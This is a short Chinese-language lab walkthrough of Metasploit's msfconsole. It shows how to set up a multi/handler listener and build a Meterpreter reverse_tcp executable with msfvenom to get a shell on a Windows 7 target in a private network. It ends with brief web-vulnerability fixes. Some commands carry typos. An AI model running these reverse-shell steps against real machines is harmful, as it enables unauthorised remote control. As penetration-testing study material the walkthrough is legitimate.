0x00msf概述

msfconsole是msf的命令行交互界面。在msfconsole中，可以实现对msf的完美操作，是一个msf的一体化操作接口，可以完全地利用msf中的各种功能，使用msfconsole特定的命令进行操作，个人认为，相对于armitage来说，更加便捷，也更有利于我们深入理解msf的各个模块的功能。


0x01复现过程


背景：已经获取到web的shell，尝试获取pc的shell。
攻击机 192.168.31.39 kali
靶机 192.168.31.227 win7
启动kali的msf，设置exploit模块
msfconsole
use exploit/multi/handler

       

use  payloadwindows/meterpreter/reverse_tcp  
//设置监听payload

set LHOST 192.168.31.39  //设置监听的ip

ser LPORT 6666   //设置监听的端口

exploit        //开始监听

生成一个exe执行文件，让内网服务器执行

msfvenom -p windows/meterpreter/reverse_tcpLHOST=192.168.31.39       LPORT=6666 -f exe > /home/test.exe   

//home目录下生成test.exe文件，

      将该文件放进内网服务器并运行，kali中会得到一个执行权限

输入shell，得到一个cmd命令执行权限
执行dos命令实现相应的操作。





0x02修复建议


      由于是已经获取了web的shell了，修复还是从web方面修复，修复一下上传的漏洞，sql和文件包含等可以获得shell并写入文件的漏洞。
